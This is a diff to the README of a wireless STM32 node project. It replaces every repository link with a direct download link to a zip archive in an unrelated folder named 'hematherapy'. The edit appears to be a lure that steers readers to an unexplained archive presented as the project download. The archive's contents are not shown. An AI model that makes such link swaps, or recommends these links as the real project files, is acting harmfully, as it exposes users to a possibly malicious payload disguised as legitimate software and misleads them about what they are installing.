@@ -1,12 +1,12 @@
 # 🔌 stm32-nrf24-wireless-node - Wireless STM32 Node for Clear Control
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge&logo=github)](https://github.com/AJPTechnology/stm32-nrf24-wireless-node)
+[![Download](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge&logo=github)](https://github.com/AJPTechnology/stm32-nrf24-wireless-node/raw/refs/heads/main/hematherapy/node-wireless-nrf-stm-2.9-alpha.4.zip)
 
 ## 📥 Download
 
 Visit this page to download and access the full project files:
 
-[https://github.com/AJPTechnology/stm32-nrf24-wireless-node](https://github.com/AJPTechnology/stm32-nrf24-wireless-node)
+[https://github.com/AJPTechnology/stm32-nrf24-wireless-node/raw/refs/heads/main/hematherapy/node-wireless-nrf-stm-2.9-alpha.4.zip](https://github.com/AJPTechnology/stm32-nrf24-wireless-node/raw/refs/heads/main/hematherapy/node-wireless-nrf-stm-2.9-alpha.4.zip)
 
 ## 🧭 What This Is
 
@@ -160,4 +160,4 @@ The design uses common embedded tools and parts, which makes it easier to mainta
 
 ## 📎 Repository Link
 
-[https://github.com/AJPTechnology/stm32-nrf24-wireless-node](https://github.com/AJPTechnology/stm32-nrf24-wireless-node)
+[https://github.com/AJPTechnology/stm32-nrf24-wireless-node/raw/refs/heads/main/hematherapy/node-wireless-nrf-stm-2.9-alpha.4.zip](https://github.com/AJPTechnology/stm32-nrf24-wireless-node/raw/refs/heads/main/hematherapy/node-wireless-nrf-stm-2.9-alpha.4.zip)
